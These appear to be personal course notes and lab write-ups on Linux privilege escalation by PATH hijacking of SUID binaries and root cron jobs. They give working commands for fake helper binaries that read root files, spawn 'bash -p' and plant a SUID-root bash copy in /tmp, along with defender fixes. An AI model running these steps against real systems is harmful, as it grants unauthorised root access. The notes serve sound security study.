#linux #privesc

A privileged program (SUID-root, or run via sudo/cron as root) calls a helper command by **bare name** — `cat`, `service`, `ps`, `id`, `ping` — instead of an absolute path. Bare names are resolved through **`$PATH`**, and if you control `$PATH`, you control which binary runs. Since the parent runs as root, *your* binary runs as root.

## The signature
A SUID binary (or sudo/cron script) that shells out to a command without a full path. For a compiled SUID binary, you can see it without source:
```bash
strings /usr/local/bin/suidprog | grep -iE 'system|popen|exec'   # does it shell out?
strings /usr/local/bin/suidprog                                  # what command, with what path?
```
If you see `cat something` (not `/bin/cat something`), and `system`/`popen` in the symbol list → hijackable. An absolute path (`/bin/cat`) is **not** vulnerable.

Why bare names resolve through PATH: `system("cat x")` runs `/bin/sh -c "cat x"`, and the shell searches each `$PATH` dir in order for `cat`.

## Exploit
```bash
# 1. a fake version of the hijacked command, doing what you want AS ROOT
printf '#!/bin/sh\n/bin/cat /root/flag.txt\n' > /tmp/cat   # read a file
# or spawn a shell:
printf '#!/bin/sh\n/bin/bash -p\n'            > /tmp/cat   # -p keeps root euid
chmod +x /tmp/cat

# 2. put your dir FIRST on PATH, then run the privileged program
PATH=/tmp:$PATH /usr/local/bin/suidprog
```
- Use an **absolute path inside** the fake script (`/bin/cat`, `/bin/bash`) or it calls itself in a loop (your dir is still first on PATH).
- `-p` on bash matters when the binary only sets euid (not real uid) — it stops bash dropping privileges on startup.

## When it DOESN'T work
- The binary calls the helper by **absolute path** (`/bin/cat`) — PATH is irrelevant.
- **sudo** context with `secure_path` set in `Defaults` (see `sudo -l`): sudo *overrides* your PATH with its own clean list, so you can't hijack a bare command run via a sudo rule. (`secure_path` does **not** protect a plain SUID binary — that uses the caller's environment.)
- The program sanitizes its own environment (resets PATH) before shelling out.

## Cron variant — you DON'T control cron's PATH
With a SUID binary you set your own `$PATH` before running it (`PATH=/tmp:$PATH ./prog`). **Cron is different** — it runs with the `PATH=` defined at the top of the crontab (or a built-in default), and you can't touch its environment. So you can't point it at `/tmp`. Instead you must **plant your fake binary in a directory that's already on cron's PATH and that you can write to.**

```bash
cat /etc/crontab /etc/cron.d/*          # read the PATH= line AND find a bare-name command
# test each dir in THAT PATH (not the standard one) for write access:
for d in <dirs from the cron PATH= line>; do [ -w "$d" ] && echo "WRITABLE: $d"; done
```
The vuln: cron's PATH **prepends a writable dir** (often a custom `/opt/.../bin`), and the job runs a bare command. Plant a fake with that command's name there:
```bash
cat > /opt/monitor/bin/sweep <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash
EOF
chmod +x /opt/monitor/bin/sweep
sleep 61 ; /tmp/rootbash -p ; id
```
Your fake wins because its dir is **earlier in the PATH string** than the real command's dir (PATH is searched left to right). → [[Cron Jobs]]

## Related trick — function/env hijack (bash)
If a SUID/root program invokes a command and bash is the shell, you can sometimes override via an exported function instead of PATH — see the `suid-env2` examples in [[06 Post Exploitation/Privilege Escalation|Privilege Escalation]].

---
## Case study — CYBR401 Lab 8 (c07 → root, SUID variant)
SUID binary surfaced in the sweep:
```
-rwsr-xr-x 1 root root /usr/local/bin/webcheck
```
`strings webcheck` showed `system` + `setuid`/`setgid` symbols and the literal line:
```
cat /opt/webops/status.txt      ← bare 'cat', not /bin/cat
```
So it elevates to root and shells out to `cat` via `$PATH`. Exploit:
```bash
printf '#!/bin/sh\n/bin/cat /root/flag.txt\n' > /tmp/cat
chmod +x /tmp/cat
PATH=/tmp:$PATH /usr/local/bin/webcheck      # fake cat runs as root → flag
```
One misconfiguration: a privileged program calling a helper by bare name. The fix a defender wants: absolute paths in privileged code, and/or reset `PATH` at startup.

**Takeaways logged:** `strings` a SUID binary for `system`/`popen` + any bare command name = PATH hijack. Fake the command, prepend your dir to `$PATH`, run the binary. Absolute path inside the fake to avoid recursion; `-p` to keep privileges.

## Case study — CYBR401 Lab 8 (c08 → root, cron variant)
`/etc/cron.d/monitor-sweep`:
```
PATH=/opt/monitor/bin:/usr/bin:/bin
* * * * * root sweep >/dev/null 2>&1
```
Cron's PATH led with a writable `/opt/monitor/bin`, and the job ran bare `sweep` as root every minute. The standard dirs weren't writable (so `export PATH` wouldn't have helped even if cron honored it) — the bug was the **writable dir prepended to cron's own PATH**. Dropped a fake `sweep` there, waited 60s → root. Defender fix: absolute paths in cron commands, and never put a user-writable dir on root's PATH.

---
Related: [[11.4 SUID + GTFO Bins]] · [[Cron Jobs]] (cron scripts calling bare commands) · [[11.1 Where to start]] (Phase 5)
